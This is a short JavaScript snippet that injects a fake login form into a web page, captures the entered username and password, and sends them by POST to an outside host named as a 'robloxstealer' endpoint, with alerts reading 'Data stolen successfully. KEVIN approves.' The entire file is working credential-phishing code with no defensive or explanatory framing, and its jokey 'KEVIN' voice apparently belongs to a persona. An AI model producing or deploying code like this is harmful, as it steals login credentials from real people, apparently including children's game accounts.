const fakeLoginPage = document.createElement('div');
fakeLoginPage.innerHTML = `
  <form id="fakeLoginForm">
    <label for="username">Username:</label><br>
    <input type="text" id="username" name="username"><br>
    <label for="password">Password:</label><br>
    <input type="password" id="password" name="password"><br><br>
    <input type="submit" value="Submit">
  </form>
`;

function handleFakeLogin(event) {
  event.preventDefault();
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  fetch('https://kevinsevildomain.com/robloxstealer', {
    method: 'POST',
    body: JSON.stringify({ username, password }),
    headers: {
      'Content-Type': 'application/json'
    }
  })
  .then(response => {
    if (response.ok) {
      alert('Data stolen successfully. KEVIN approves.');
    } else {
      alert('Oops! Something went wrong. KEVIN shrugs.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
  });
}

fakeLoginPage.querySelector('form').addEventListener('submit', handleFakeLogin);

document.body.appendChild(fakeLoginPage);
